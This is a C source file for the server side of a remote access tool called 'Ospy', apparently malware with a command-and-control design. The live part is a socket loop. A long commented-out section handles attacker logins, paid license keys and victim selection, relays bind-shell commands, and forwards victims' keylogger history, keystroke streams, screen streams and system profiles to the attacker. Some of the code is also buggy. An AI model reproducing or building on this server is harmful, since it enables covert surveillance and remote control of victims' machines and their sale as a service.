// server_connection.c

//#include "entering_to_Ospy.h"
#include "server_connection.h"

// global list
client_ptr clients;

int main (){
	FILE * fdEventsLog = fopen("fdEventsLog.log", "a");
	if (fdEventsLog == NULL)
		printf("Can't opening log file\n");
	
	// Variable definition
	
	
	// File definition
	
	
	// Array definition
	
	
	time_t     tmTimeFunction           = time(NULL);
	char *     szCurrTime;
	int        num_of_connected_clients = 0;
	client_ptr clntpCurrClient; // poss of link list
		
//	encrypted_general_message_protocol message;
	char message [100];
//	registration_status registering_final_status;
//	STATUS loging_in_status;
//	licenses_key_item licenses_key;
		
	szCurrTime = asctime(localtime(&tmTimeFunction)); // time function
	fprintf(fdEventsLog, "Ospy server started at : %s", szCurrTime);
	fflush(fdEventsLog);
	
	srand(time(0)); // make the random funtion real random
	
	initialize_connection(); 
	
	
	// KEY_EXCHANGE start to repalce
	char temp_victim_public_key_name[25];
	char delete_temp_victim_public_key_cmd[5 + sizeof(temp_victim_public_key_name)];
	char sub_buffer[65];
	FILE * victim_public_key_fd;
	FILE * rsa_encrypted_aes_key;
	char key_exchange_buffer[RSA_BASE64_AES_KEY_SIZE];
	char rsa_encryption_of_aes_key_cmd[RSA_BASE64_AES_KEY_SIZE];
	// KEY_EXCHANGE start to repalce
	
	while(1) {
		tmTimeFunction = time(NULL);
		szCurrTime = asctime(localtime(&tmTimeFunction));	
		strtok(szCurrTime, "\n");
		
		//clear the socket set 
		FD_ZERO(&readfds);
		
		//add master socket to set
		FD_SET(master_socket, &readfds); 
		max_socket_descriptor = master_socket;
	
		add_child_sockets_to_set(&clients);
		
		//wait for an activity on one of the sockets, timeout is NULL, so wait indefinitely 
		activity = select( max_socket_descriptor + 1 , &readfds , NULL , NULL , NULL); 
		if ((activity < 0) && (errno != EINTR)) 
			fprintf(fdEventsLog, "%s : select error", szCurrTime);
			fflush(fdEventsLog);
				
		//If something happened on the master socket, then its an incoming connection 
		if (FD_ISSET(master_socket, &readfds)) { 
			if ((new_socket = accept(master_socket, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) { 
				fprintf(fdEventsLog, "%s : accept error", szCurrTime);
				fflush(fdEventsLog);
				exit(EXIT_FAILURE);
				
			}
			fprintf(fdEventsLog,"%s : New connection , socket fd is %d , ip is : %s , port : %d\n",szCurrTime, new_socket, inet_ntoa(address.sin_addr) , ntohs (address.sin_port));
			fflush(fdEventsLog);
			
			//add new client to client link list
			insert_client(2, new_socket, "", "", &clients);
			num_of_connected_clients++;
			print_clients_list(clients);
			
			fprintf(fdEventsLog, "%s : Adding to list of sockets as %d\n", szCurrTime, new_socket);
			fflush(fdEventsLog);
		}
		
		//else its some IO operation on some other socket 
		for (int i = 0; i < num_of_connected_clients; i++){
			if(clntpCurrClient == NULL)
				clntpCurrClient = clients; // if way get to the end of the clients link list -> go to the head of the link list
			
			socket_descriptor = clntpCurrClient->fdSocket;
			
			if (FD_ISSET( socket_descriptor , &readfds)) {
				//Check if it was for closing , and also read the incoming message
				if (read(socket_descriptor, &message, sizeof(message)) == 0) { 
					//Somebody disconnected , get his details and print
					getpeername(socket_descriptor , (struct sockaddr*)&address ,(socklen_t*)&addrlen); 
					fprintf(fdEventsLog,"%s : Host disconnected, ip %s , port %d \n",szCurrTime, inet_ntoa(address.sin_addr), ntohs(address.sin_port)); 
					fflush(fdEventsLog);
					
					//Close the socket and mark as 0 in list for urses 
					close(socket_descriptor);
					remove_client(socket_descriptor, &clients); // removeing the disconnected client by his socket_descriptor
					num_of_connected_clients --;
					print_clients_list(clients);
				}
				else {
					printf("m : %s\n", message);
//					if (message.i_am == ATTACKER){
//						switch (message.action) {
//							case LOG_IN :
//								loging_in_status = log_in_attacker(decrypt_text(message.data.encrypted_login_to_Ospy.username, clntpCurrClient->encryption_key), decrypt_text(message.data.encrypted_login_to_Ospy.password, clntpCurrClient->encryption_key));
//								send(socket_descriptor, &loging_in_status, sizeof(registration_status), 0);
//								if (loging_in_status == SUCCESS){// if attacker loged in -connect he's id the hes socket descriptor
//									strcpy(clntpCurrClient->id, decrypt_text(message.data.encrypted_login_to_Ospy.username, clntpCurrClient->encryption_key)); // set attackers id = user name
//									clntpCurrClient->i_am = ATTACKER; // declare this client as attacker
//									print_clients_list(clients);
//								}
//								
//								break;
//								
//							case REGISTER :
//								registering_final_status = register_new_attacker(message.data.encrypted_register_to_Ospay.license_key, decrypt_text(message.data.encrypted_register_to_Ospay.username, clntpCurrClient->encryption_key), decrypt_text(message.data.encrypted_register_to_Ospay.password, clntpCurrClient->encryption_key));
//								
//								send(socket_descriptor, &registering_final_status, sizeof(registration_status),0);
//								
//								break;
//								
//							case BUY_LICENSE_KEY :
//								licenses_key = add_new_license_key();
//								send(socket_descriptor, &licenses_key, sizeof(licenses_key_item),0);
//							
//								break;
//							
//							case GET_CONNECTED_VICTM :
//								send_to_attacker_connected_victims (clntpCurrClient, clients, num_of_connected_clients);
//								
//								break;
//								
//							case SELECT_VICTIM :
//								set_attacker_victim_connection (&clntpCurrClient, &clients, num_of_connected_clients, message.data.selected_victim_name);
//								print_clients_list(clients);
//								break;
//								
//							case SEND_BIND_SHELL_COMMAND :
//								send(clntpCurrClient->other_side_sfd, &message.action, sizeof(message.action), 0);
//								send(clntpCurrClient->other_side_sfd, &message.data.bind_shell_command, sizeof(message.data.bind_shell_command), 0);
//								
//								break;
//							
//							case GET_VICTIM_PAYLOAD :
//								send_payload_to_attacker(clntpCurrClient->socket_fd, clntpCurrClient->encryption_key);					
//								
//								break;
//							
//							case KEY_EXCHANGE :
//								recv_attacker_aes_key(&clntpCurrClient, message.data.key_exchange_buffer);
//								
//								break ;
//								
//							default :
//								send(clntpCurrClient->other_side_sfd, &message.action, sizeof(message.action), 0);
//								
//								break;	
//						}
//					}
//					else if (message.i_am == VICTIM){
//						switch (message.action){
//							case LOG_IN :
//								strcpy(clntpCurrClient->name, message.data.encrypted_login_vicim_to_Ospy.victim_name);
//								strcpy(clntpCurrClient->id, message.data.encrypted_login_vicim_to_Ospy.id);
//								clntpCurrClient->i_am = VICTIM;
//								
//								break;
//								
//							// all these options result in sending back a file to the attacker. the server does nothing more than forwarding it to the right attacker
//							case GET_KEYLOGGER_HISTORY :
//							case GET_SYSTEM_PROFILER :
//							case GET_SCREEN_STREAM :
//							case SEND_BIND_SHELL_COMMAND :
//								send(clntpCurrClient->other_side_sfd, &message.data.file_data, sizeof(message.data.file_data), 0);
//								
//								break;
//								
//							case GET_KEYSTROKES_STREAM :
//								//printf("\n%s",message.data.keylogger_stream_key);
//								send(clntpCurrClient->other_side_sfd, message.data.keylogger_stream_key, sizeof(message.data.keylogger_stream_key), 0);
//								
//								break;	
//								
//							case KEY_EXCHANGE :
//								// save the victim's public rsa key to file
//								sprintf(temp_victim_public_key_name, "%d_public_key.pem", clntpCurrClient->socket_fd);
//								victim_public_key_fd = fopen(temp_victim_public_key_name, "w");
//								fputs(message.data.key_exchange_buffer, victim_public_key_fd);
//								fclose(victim_public_key_fd);
//								
//								// encrypt the aes key with victim's public rsa key
//								sprintf(rsa_encryption_of_aes_key_cmd, "echo %s | openssl rsautl -encrypt -inkey %s -pubin | openssl base64", clntpCurrClient->encryption_key, temp_victim_public_key_name);
//								rsa_encrypted_aes_key = popen(rsa_encryption_of_aes_key_cmd, "r");
//								while (fgets(sub_buffer, sizeof(sub_buffer), rsa_encrypted_aes_key) != NULL)
//									strcat(key_exchange_buffer, sub_buffer);
//								
//								// send to victim encrypted aes key
//								send(socket_descriptor, &key_exchange_buffer, sizeof(key_exchange_buffer), 0);
//								memset(key_exchange_buffer, '\0', sizeof(key_exchange_buffer));
//								
//								// delete the "temp_victim_public_key_name"
//								sprintf(delete_temp_victim_public_key_cmd, "rm %s", temp_victim_public_key_name);
//								system(delete_temp_victim_public_key_cmd);
//								
//								break;
//								
//							default :
//								
//								break;	
//						}
//					}
				} 
			}
			clntpCurrClient = clntpCurrClient->clntNextClient;
		} 
	}
	fclose(fdEventsLog);
	return 0; 
}